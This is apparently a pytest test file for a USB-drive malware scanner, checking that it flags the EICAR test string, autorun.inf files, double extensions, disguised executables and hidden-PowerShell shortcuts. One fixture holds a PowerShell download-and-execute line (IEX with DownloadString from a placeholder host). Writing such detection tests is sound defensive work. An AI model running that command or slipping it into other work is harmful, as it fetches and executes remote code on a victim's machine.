import hashlib
from pathlib import Path

import pytest

from usbscan.scanner import ScanConfig, scan

EICAR = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"


def run_scan(root: Path, **overrides):
    config = ScanConfig(roots=[root], hash_database=overrides.pop("hash_database", {}), **overrides)
    return scan(config)


def rules_for(summary, filename: str) -> set[str]:
    return {
        finding.rule
        for result in summary.flagged
        if Path(result.path).name == filename
        for finding in result.findings
    }


def test_clean_file_has_no_findings(tmp_path):
    (tmp_path / "notes.txt").write_text("grocery list")
    summary = run_scan(tmp_path)
    assert summary.files_scanned == 1
    assert summary.flagged == []


def test_known_bad_hash_is_critical(tmp_path):
    sample = tmp_path / "sample.bin"
    sample.write_text(EICAR)
    digest = hashlib.sha256(sample.read_bytes()).hexdigest()
    summary = run_scan(tmp_path, hash_database={digest: "EICAR"})
    assert summary.flagged[0].top_severity == "critical"
    assert "known_bad_hash" in rules_for(summary, "sample.bin")


def test_root_autorun_is_flagged(tmp_path):
    (tmp_path / "autorun.inf").write_text("[autorun]\nopen=setup.exe\n")
    assert "autorun_inf" in rules_for(run_scan(tmp_path), "autorun.inf")


def test_autorun_in_subfolder_is_not_flagged(tmp_path):
    nested = tmp_path / "backup"
    nested.mkdir()
    (nested / "autorun.inf").write_text("[autorun]\n")
    assert run_scan(tmp_path).flagged == []


def test_double_extension_is_flagged(tmp_path):
    (tmp_path / "invoice.pdf.exe").write_bytes(b"MZ" + b"\x00" * 64)
    assert "double_extension" in rules_for(run_scan(tmp_path), "invoice.pdf.exe")


def test_executable_disguised_as_image_is_flagged(tmp_path):
    (tmp_path / "holiday.jpg").write_bytes(b"MZ" + b"\x90" * 128)
    assert "disguised_executable" in rules_for(run_scan(tmp_path), "holiday.jpg")


def test_shortcut_launching_powershell_is_flagged(tmp_path):
    (tmp_path / "Documents.lnk").write_bytes(b"L\x00\x00\x00" + b"powershell.exe -w hidden")
    assert "shortcut_launches_interpreter" in rules_for(run_scan(tmp_path), "Documents.lnk")


def test_multiple_script_indicators_raise_severity(tmp_path):
    (tmp_path / "update.ps1").write_text("powershell -enc AAAA; IEX (New-Object Net.WebClient).DownloadString('http://x')")
    summary = run_scan(tmp_path)
    assert summary.flagged[0].top_severity == "high"


def test_quarantine_moves_file_off_the_drive(tmp_path):
    drive, vault = tmp_path / "drive", tmp_path / "vault"
    drive.mkdir()
    (drive / "autorun.inf").write_text("[autorun]\nopen=x.exe\n")
    summary = run_scan(drive, quarantine_directory=vault)
    assert not (drive / "autorun.inf").exists()
    assert Path(summary.flagged[0].quarantined_to).exists()


def test_yara_rule_matches_eicar(tmp_path):
    pytest.importorskip("yara")
    from usbscan.cli import DATA_DIRECTORY
    from usbscan.yara_engine import YaraEngine

    (tmp_path / "test.com").write_text(EICAR)
    summary = run_scan(tmp_path, yara_engine=YaraEngine(DATA_DIRECTORY))
    assert "EICAR_Test_File" in rules_for(summary, "test.com")
